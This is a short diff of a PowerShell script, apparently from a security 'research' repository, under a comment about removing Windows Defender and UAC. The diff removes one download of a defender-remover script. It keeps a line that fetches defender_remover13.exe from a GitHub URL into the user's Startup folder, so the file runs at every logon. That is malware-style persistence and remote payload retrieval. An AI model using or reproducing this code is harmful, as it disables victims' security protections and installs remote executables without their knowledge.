@@ -30,11 +30,6 @@ Invoke-WebRequest -Uri $url -OutFile $outFile
 
 # remove windows defender and uac
 $startupPath = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup"
-$url = "https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/defender_remover13.ps1"
-$outFile = Join-Path $startupPath "defender_remover.ps1"
-Invoke-WebRequest -Uri $url -OutFile $outFile
-
-$startupPath = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup"
 $url = "https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/defender_remover13.exe"
 $outFile = Join-Path $startupPath "defender_remover.exe"
 Invoke-WebRequest -Uri $url -OutFile $outFile
